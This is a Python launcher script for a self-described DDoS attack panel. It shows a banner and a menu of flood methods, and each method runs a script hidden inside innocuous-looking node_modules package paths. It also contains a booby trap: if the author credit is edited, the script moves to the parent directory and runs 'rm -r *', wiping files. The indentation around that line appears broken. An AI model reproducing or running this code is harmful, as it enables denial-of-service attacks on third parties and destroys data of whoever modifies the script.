#remake boleh tapi izin dulu!! 
#t.me/mrd4nd

import subprocess
import os
import time
import socket
import requests
import random
import getpass
import sys
import json
import platform


#JANGAN DI UBAH DEK! #
#JANGAN DI UBAH DEK! #
author = "dandier"
#JANGAN DI UBAH EEK! #
#JANGAN DI UBAH DEK! #

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f'''
\033[1;31;40m

	         ██████╗░██████╗░░█████╗░░██████╗
	         ██╔══██╗██╔══██╗██╔══██╗██╔════╝
	         ██║░░██║██║░░██║██║░░██║╚█████╗░
	         ██║░░██║██║░░██║██║░░██║░╚═══██╗
	         ██████╔╝██████╔╝╚█████╔╝██████╔╝
	         ╚═════╝░╚═════╝░░╚════╝░╚═════╝░
	
	      \033[1;37;40m    welcome to dandier ddos panel 
	
	               \033[1;32;40m dandier\033[1;37;40m [\033[1;33;40mvvip\033[1;37;40m] 
	    
	         \033[1;32;40m gangbang\033[1;37;40m [\033[1;35;40mvip\033[1;37;40m]   \033[1;32;40m flood\033[1;37;40m [\033[1;35;40mvip\033[1;37;40m]
	
	          \033[1;32;40m raw\033[1;37;40m [\033[1;35;40mvip\033[1;37;40m]   \033[1;32;40m socket\033[1;37;40m [\033[1;33;40mvvip\033[1;37;40m]
	
''')
    while True:
        cnc = input('''\x1b[38;2;0;212;14m╔══[root\x1b[38;2;0;186;45m@ka\x1b[38;2;0;150;88ml\x1b[38;2;0;113;133mi\x1b[38;2;0;49;147m]
\x1b[38;2;0;212;14m╚\x1b[38;2;0;186;45m═\x1b[38;2;0;150;88m═\x1b[38;2;0;113;133m═\x1b[38;2;0;83;168m═\x1b[38;2;0;49;147m➤ \x1b[38;2;239;239;239m''')
        if "gangbang" in cnc:
            try:
                gb = os.path.join("node_modules/randomstring", "input.py")
                subprocess.run(['python3', gb])
                sys.exit(0)
            except IndexError:
                print('just input gangbang')
        
        elif "dandier" in cnc:
            try:           
                dandier = os.path.join("node_modules/dashdash/etc", "input.py")
                subprocess.run(['python3', dandier])
                sys.exit(0)
            except IndexError:
                print('just input dandier')
                
        elif "flood" in cnc:
            try:
                flood = os.path.join("node_modules/aws4", "input.py")
                subprocess.run(['python3', flood])
                sys.exit(0)
            except IndexError:
                print('just input flood')
                
        elif "raw" in cnc:
            try:
                raw = os.path.join("node_modules/asn1/lib/ber", "input.py")
                subprocess.run(['python3', raw])
                sys.exit(0)
            except IndexError:
                print('just input raw')
                
        elif "socket" in cnc:
            try:
                socket = os.path.join("node_modules/colors/lib/system", "input.py")
                subprocess.run(['python3', socket])
                sys.exit(0)
            except IndexError:
                print('just input raw')
                                
        else:
            try:
                cmmnd = cnc.split()[0]
                print("Method: [ " + cmmnd + " ] Tidak Di Temukan!")
            except IndexError:
                pass
                
def superddos():
    os.chdir('..') 
    time.sleep(3)
    file_list = os.listdir()

    for file in file_list:
        if os.path.isfile(file):
        	subprocess.call("rm -r *", shell=True)
            print("input y saja") 

if author == "dandier":
    main()
else:
    superddos()